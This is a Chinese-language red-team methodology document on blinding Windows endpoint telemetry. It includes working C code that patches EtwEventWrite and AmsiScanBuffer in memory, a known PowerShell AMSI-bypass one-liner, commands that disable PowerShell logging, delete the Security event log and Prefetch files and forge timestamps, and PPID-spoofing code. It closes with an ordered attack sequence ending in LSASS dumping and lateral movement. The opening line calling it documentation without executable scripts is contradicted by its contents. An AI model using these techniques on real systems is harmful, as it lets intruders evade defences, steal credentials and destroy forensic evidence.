# 遥测致盲：ETW / AMSI / 反取证

> 仅文档：本文是方法论参考，不含可执行脚本。

EDR 的检出能力高度依赖两条遥测管道：ETW（Event Tracing for Windows）与 AMSI（Antimalware Scan Interface）。本文汇总针对这两条管道的对抗手段，并补充 Sysmon 规避、日志清理、时间戳伪造等反取证组合。

对应 MITRE ATT&CK：T1562.001 / T1562.002 / T1562.006 / T1070 / T1027。

## 1. ETW 内部结构

ETW 是 Windows 内建的高性能事件追踪框架，EDR 用它做轻量内核遥测。红队最关心的 provider：

| Provider GUID | 名称 | 使用者 |
|--------------|------|--------|
| `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}` | Microsoft-Windows-Threat-Intelligence (ETW-TI) | Defender、MDE、第三方 EDR |
| `{A0C1853B-5C40-4B15-8766-3CF1C58F985A}` | Microsoft-Antimalware-Scan-Interface | Defender AMSI 上报 |
| `{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}` | Microsoft-Windows-Kernel-Process | 进程 / 线程基础事件 |
| `{2839FF94-8F12-4E1B-82E3-AF7AF77A450F}` | Microsoft-Windows-DotNETRuntime | .NET 加载、JIT |
| `{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}` | .NET CLR | CLR 启动 |

### 关键用户态 API

| API | DLL | 作用 |
|-----|-----|------|
| `EtwEventWrite` | `ntdll.dll` | 写事件（最常用） |
| `EtwEventWriteFull` | `ntdll.dll` | 带 activity ID 的事件 |
| `EtwEventWriteEx` | `ntdll.dll` | 扩展版本 |
| `NtTraceEvent` | `ntdll.dll` | EtwEventWrite 底层 |
| `NtTraceControl` | `ntdll.dll` | 控制 trace session（启 / 停 / 查询 provider） |
| `EtwEventEnabled` | `ntdll.dll` | provider 是否启用 |
| `EtwEventRegister` | `ntdll.dll` | 注册 provider |

### 事件调用链

```text
应用代码 EventWrite(...)
  → 微软封装 (TraceLogging API)
  → ntdll!EtwEventWrite[Full|Ex]
  → ntdll!NtTraceEvent (syscall)
  → nt!NtTraceEvent (内核)
  → 内核 ETW core → 消费端（EDR 用户态进程订阅 session）
```

## 2. ETW Patch 的四种打法

### 打法 A：EtwEventWrite 入口改成立即返回

```text
原始入口（x64）:
  4C 8B DC                 mov r11, rsp
  48 81 EC 88 00 00 00     sub rsp, 88h
  ...

patch 后:
  33 C0                    xor eax, eax       ; STATUS_SUCCESS = 0
  C3                       ret
```

```c
#include <windows.h>

BOOL PatchEtwEventWrite(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) return FALSE;

    BYTE patch[] = { 0x33, 0xC0, 0xC3 };   // xor eax,eax; ret
    DWORD oldProt = 0;

    // VirtualProtect 自身可能被 hook，改用 indirect syscall 版本
    if (!VirtualProtect(pEtw, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt))
        return FALSE;

    memcpy(pEtw, patch, sizeof(patch));

    VirtualProtect(pEtw, sizeof(patch), oldProt, &oldProt);
    return TRUE;
}
```

**OPSEC 要点**：改写 ntdll 内存本身会触发 ETW-TI 的 `ALPC_MODIFY_PROCESS` / `PROTECTVM` 事件。必须先走 indirect syscall 绕过 `NtProtectVirtualMemory` 的 hook 再做 patch，否则补丁未生效告警先到。

### 打法 B：EtwEventEnabled 恒返回 FALSE

不改 `EtwEventWrite`，改让 `EtwEventEnabled` 永远返回 FALSE：上层代码据此判断"provider 未启用"从而不调用 `EtwEventWrite`。优点是绕开了很多 EDR 对 `EtwEventWrite` 字节的完整性校验。

```c
BYTE patch[] = { 0x32, 0xC0, 0xC3 };   // xor al,al; ret
```

### 打法 C：NtTraceControl 停掉 session

直接以 syscall 关闭 EDR 的 trace session（侵入式，但不写 ntdll 字节）：

```c
// NtTraceControl(EtwpStopTrace, ...)
// 需要 SeSystemProfilePrivilege 或更高
// 适用于 Local Admin + UAC bypass 之后
```

实战中不常用：停 session 本身会被另一条管道感知为 "ETW provider stopped"，且需要高权限。

### 打法 D：内核态 ETW patch

```text
nt!EtwpEventTracingProviderEnableInfo
nt!EtwThreatIntProvRegHandle
置 0 后所有 ETW-TI 事件被丢弃
```

属于 `attack-chain` 的 BYOVD 阶段，本 Skill 不展开。

## 3. AMSI 绕过

AMSI 让 PowerShell / .NET / WMI / VBA 在执行脚本前先过一遍反病毒扫描。红队碰到的绝大多数场景是 PowerShell + AMSI。

### 经典 AmsiScanBuffer patch

```c
// amsi.dll!AmsiScanBuffer 入口写入:
//   mov eax, 0x80070057     ; E_INVALIDARG
//   ret                     ; x64（x86 为 ret 4）

BOOL PatchAmsi(void) {
    HMODULE h = LoadLibraryA("amsi.dll");
    if (!h) return FALSE;
    FARPROC p = GetProcAddress(h, "AmsiScanBuffer");
    if (!p) return FALSE;

    BYTE patch64[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,   // mov eax, 0x80070057
        0xC3                              // ret
    };
    DWORD old = 0;
    VirtualProtect(p, sizeof(patch64), PAGE_EXECUTE_READWRITE, &old);
    memcpy(p, patch64, sizeof(patch64));
    VirtualProtect(p, sizeof(patch64), old, &old);
    return TRUE;
}
```

PowerShell 一句话概念演示（真实环境需配合混淆 / HWBP）：

```powershell
[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+'msi'+'Utils')).GetField($([char]97+'msiInitFailed'),'NonPublic,Static').SetValue($null,$true)
```

### 方案一：硬件断点绕过

不改 amsi.dll 内存，规避完整性扫描：

1. AddVectoredExceptionHandler
2. `AmsiScanBuffer` 入口设 `DR0`
3. VEH 命中后改写 `RAX = 0x80070057`、`RIP = ret 指令地址`、`RSP += 8`
4. ContinueExecution

与 `unhook-techniques.md` 的 HWBP Blindside 共用同一套 VEH 基础设施。

### 方案二：破坏 AmsiContext / AmsiSession

构造畸形 `AmsiContext`，让 `AmsiScanBuffer` 内部校验失败但提前返回成功：

```text
// AmsiContext 头部魔数应为 "AMSI"
// 改为 "XXXX" → 内部校验失败，返回 S_OK + AMSI_RESULT_CLEAN
```

### 方案三：反射加载干净 amsi.dll

不走系统 amsi.dll，反射加载一份干净副本并重定向 PowerShell 引擎的 AMSI 调用。适用于在加载阶段就拦截 PowerShell.exe 启动的高级 EDR。

## 4. 反取证

### 关 PowerShell 日志

```powershell
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
    -Name 'EnableScriptBlockLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' `
    -Name 'EnableModuleLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' `
    -Name 'EnableTranscripting' -Value 0 -Force
```

组策略路径：Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell → Turn on PowerShell Script Block Logging = Disabled。

### 清 PowerShell 历史

```powershell
Clear-History
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
```

### 清 Prefetch

```powershell
# 需要 SYSTEM 权限
Remove-Item 'C:\Windows\Prefetch\implant*.pf' -Force
```

### 清事件日志

```powershell
logman stop "EventLog-Security" -ets
Remove-Item 'C:\Windows\System32\winevt\Logs\Security.evtx' -Force -ErrorAction SilentlyContinue
# 直接删 .evtx 会触发 Event Log Service 重建并记录 "log cleared" (Event ID 1102)
# 更隐蔽：内存中 patch wevtsvc.dll 的 EventLog API（T1070.001）
```

### 时间戳伪造（T1070.006）

```powershell
$f = 'C:\Windows\Temp\implant.dll'
$ref = 'C:\Windows\System32\notepad.exe'
(Get-Item $f).CreationTime   = (Get-Item $ref).CreationTime
(Get-Item $f).LastWriteTime  = (Get-Item $ref).LastWriteTime
(Get-Item $f).LastAccessTime = (Get-Item $ref).LastAccessTime
```

## 5. Sysmon 规避

Sysmon 是社区最常见的免费遥测（企业多用 olaf 配置）。关键事件：

| Event ID | 含义 |
|----------|------|
| 1 | ProcessCreate（PPID、CommandLine、Hash） |
| 7 | ImageLoad（DLL 加载） |
| 8 | CreateRemoteThread |
| 10 | ProcessAccess（OpenProcess） |
| 11 | FileCreate |
| 12/13/14 | 注册表 |
| 22 | DNS Query |
| 25 | ProcessTampering（image hollowing） |

### 规避思路

1. **不新建进程** — 全部在已注入进程内行动，绕开 Event ID 1
2. **PPID spoof** — `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)` 把父进程设为 `explorer.exe`

```c
STARTUPINFOEX si = {0};
PROCESS_INFORMATION pi = {0};
SIZE_T size = 0;
HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, g_explorerPid);

si.StartupInfo.cb = sizeof(STARTUPINFOEX);
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
UpdateProcThreadAttribute(si.lpAttributeList, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
```

3. **内存策略** — Process Hollowing 已被 Event ID 25 捕获，改用 **module stomping**（覆盖已加载合法 DLL 的节区）或 **dirty vanity**，配合 PPID spoof
4. **不远程线程** — 绕开 Event ID 8；改用 `NtCreateThreadEx` 进程内执行 / APC / Early Bird APC
5. **DNS 走 DoH / HTTPS** — 绕开 Event ID 22

## 6. Call Stack Spoof 与事件画像

某些场景无法避免 spawn 子进程时，让事件看起来像合法软件：

- CommandLine 仿照合法软件格式
- PPID spoof 到 services.exe（伪装 SCM 启动的服务）
- module stomping 把 implant 代码放进签名 DLL 的内存空间，改掉 ImageLoad 看到的 Image hash
- CallStackSpoofer：Sysmon 即使开了 EnableCallTracing 也看不到 implant 帧

## 7. 操作顺序

顺序颠倒会让 EDR 先收到告警，后续动作被熔断。正确顺序：

```text
1. AMSI bypass (HWBP 优先，避免写 amsi.dll)
   ─── 让 .NET / PowerShell 装载 implant 不被扫
2. ETW patch (先 patch EtwEventWrite，再做任何 syscall)
   ─── 关掉自身后续动作的遥测
3. NtProtectVirtualMemory 改走 indirect syscall
   ─── 准备好安全的内存权限切换通道
4. Unhook ntdll (fresh ntdll) 或启用 indirect syscall
   ─── 抹掉用户态 hook
5. Call stack spoof setup
   ─── 准备好之后所有 syscall 的伪栈
6. 实际 payload 执行 (注入 / 横向 / dump LSASS)
7. 清痕迹 (PowerShell history / Prefetch / 时间戳)
```

错误顺序示例：

```text
✗ 先 unhook ntdll → ETW-TI 立即上报 PROTECTVM + module modification
✗ 先 dump LSASS → AMSI / ETW 尚未压制，高置信 T1003.001 告警
✓ AMSI → ETW → unhook → spoof → payload
```

## 参考资料

- ETW 文档：<https://learn.microsoft.com/en-us/windows/win32/etw/event-tracing-portal>
- ETW Patching 综述：<https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/>
- AMSI Bypass 集合：<https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell>
- Sysmon olaf 配置：<https://github.com/olafhartong/sysmon-modular>
- PPID Spoofing：<https://blog.didierstevens.com/2017/03/20/>
- Ekko sleep mask：<https://github.com/Cracked5pider/Ekko>
- Foliage sleep obfuscation：<https://github.com/SecIdiot/FOLIAGE>
- MITRE T1562.002：<https://attack.mitre.org/techniques/T1562/002/>
- MITRE T1562.006：<https://attack.mitre.org/techniques/T1562/006/>
- MITRE T1070：<https://attack.mitre.org/techniques/T1070/>

## 路由回调

三件套（hook 调研 → unhook → 遥测致盲）完成后回到 `SKILL.md` Step 5 在沙箱验证，再进入 `attack-chain/` 的 initial access 与 lateral movement 章节。
